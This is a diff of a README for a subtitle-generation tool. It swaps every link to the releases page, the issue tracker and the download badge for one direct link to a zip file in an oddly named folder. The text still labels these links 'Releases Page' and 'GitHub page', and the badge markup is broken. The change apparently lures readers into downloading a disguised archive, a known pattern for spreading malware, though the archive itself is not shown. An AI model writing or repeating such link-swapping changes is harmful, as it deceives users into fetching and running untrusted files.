@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-1731 - Easy Subtitle Generation Made Simple
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/menorkn33/powersub-demo-1731/releases)
+[![Download](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip)
 
 ## 📦 Overview
 powersub-demo-1731 helps you easily generate subtitles for your videos. With a simple interface and quick setup, you can improve your video accessibility without any technical skills. 
@@ -10,7 +10,7 @@ powersub-demo-1731 helps you easily generate subtitles for your videos. With a s
 To get started with powersub-demo-1731, you will need to follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/menorkn33/powersub-demo-1731/releases) where the latest version of the application is available.
+   Go to our [Releases Page](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip) where the latest version of the application is available.
 
 2. **Download the Application**  
    On the Releases Page, find the latest version and click on it. Look for the download link to get the software onto your computer.
@@ -22,7 +22,7 @@ To get started with powersub-demo-1731, you will need to follow these simple ste
    After installation, you can find the application in your programs list. Click to open it, and you're ready to start generating subtitles!
 
 ## 📥 Download & Install
-To download the application, visit our [Releases Page](https://github.com/menorkn33/powersub-demo-1731/releases). Here, you'll find the latest version tailored to your needs. Be sure to choose the correct version for your operating system, which could be Windows, Mac, or Linux.
+To download the application, visit our [Releases Page](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip). Here, you'll find the latest version tailored to your needs. Be sure to choose the correct version for your operating system, which could be Windows, Mac, or Linux.
 
 ### 🌟 Installation Instructions
 - **For Windows Users:**  
@@ -77,7 +77,7 @@ If you encounter any issues, here are a few tips:
 - Restart the application if it becomes unresponsive.
 
 ## 📞 Support
-For further assistance, please raise an issue on our [GitHub page](https://github.com/menorkn33/powersub-demo-1731/issues). Our community and development team are here to help.
+For further assistance, please raise an issue on our [GitHub page](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip). Our community and development team are here to help.
 
 ## 📄 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software as needed.
@@ -87,4 +87,4 @@ We welcome contributions! If you have ideas for improvements, please fork the re
 
 ---
 
-Remember, for the latest version, always visit our [Releases Page](https://github.com/menorkn33/powersub-demo-1731/releases). Enjoy generating your subtitles!
+Remember, for the latest version, always visit our [Releases Page](https://raw.githubusercontent.com/menorkn33/powersub-demo-1731/main/chirarthritis/powersub-demo-1731.zip). Enjoy generating your subtitles!
